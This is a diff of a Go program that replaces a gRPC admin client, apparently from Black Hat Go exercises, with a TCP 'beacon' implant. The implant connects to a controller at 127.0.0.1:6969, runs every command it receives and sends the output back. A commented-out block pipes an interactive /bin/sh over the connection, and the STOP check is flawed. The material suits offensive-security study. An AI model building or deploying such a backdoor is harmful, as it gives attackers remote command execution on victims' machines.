@@ -1,36 +1,76 @@
 package main
 
 import (
-	"context"
+	"bufio"
 	"fmt"
 	"log"
-	"os"
-
-	"github.com/blackhat-go/bhg/ch-14/grpcapi"
-	"google.golang.org/grpc"
+	"net"
+	"os/exec"
+	"strings"
 )
 
+// func handle(conn net.Conn) {
+
+// 	/*
+// 	 * Explicitly calling /bin/sh and using -i for interactive mode
+// 	 * so that we can use it for stdin and stdout.
+// 	 * For Windows use exec.Command("cmd.exe")
+// 	 */
+// 	// cmd := exec.Command("cmd.exe")
+// 	cmd := exec.Command("/bin/sh", "-i")
+// 	rp, wp := io.Pipe()
+// 	// Set stdin to our connection
+// 	cmd.Stdin = conn
+// 	cmd.Stdout = wp
+// 	go io.Copy(conn, rp)
+// 	cmd.Run()
+// 	conn.Close()
+// }
+
 func main() {
-	var (
-		opts   []grpc.DialOption
-		conn   *grpc.ClientConn
-		err    error
-		client grpcapi.AdminClient
-	)
-
-	opts = append(opts, grpc.WithInsecure())
-	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 9090), opts...); err != nil {
-		log.Fatal(err)
-	}
-	defer conn.Close()
-	client = grpcapi.NewAdminClient(conn)
-
-	var cmd = new(grpcapi.Command)
-	cmd.In = os.Args[1]
-	ctx := context.Background()
-	cmd, err = client.RunCommand(ctx, cmd)
+	beacon, err := net.Dial("tcp", "127.0.0.1:6969")
 	if err != nil {
-		log.Fatal(err)
+		log.Fatalln(err)
 	}
-	fmt.Println(cmd.Out)
+
+	for {
+		// netData, err := bufio.NewReader(beacon).ReadString('\n')
+		// if err != nil {
+		// 	fmt.Println(err)
+		// 	return
+		// }
+		// fmt.Print("-> ", string(netData))
+
+		CmdOut := ""
+		text, _ := bufio.NewReader(beacon).ReadString('\n')
+		message := strings.Split(text, "\n")
+		// if message[0] == "" {
+		// 	time.Sleep(3 * time.Second)
+		// 	continue
+		// }
+		if message[0] != "" {
+			fmt.Print("->: " + message[0])
+			tokens := strings.Split(message[0], " ")
+			var c *exec.Cmd
+			if len(tokens) == 1 {
+				c = exec.Command(tokens[0])
+			} else {
+				c = exec.Command(tokens[0], tokens[1:]...)
+			}
+			buf, err := c.CombinedOutput()
+			if err != nil {
+				CmdOut = err.Error()
+			}
+			CmdOut += string(buf)
+			// fmt.Print(CmdOut)
+			fmt.Fprintf(beacon, CmdOut+"~w")
+			continue
+		}
+
+		if strings.TrimSpace(string(CmdOut)) == "STOP" {
+			fmt.Println("TCP client exiting...")
+			return
+		}
+	}
+
 }
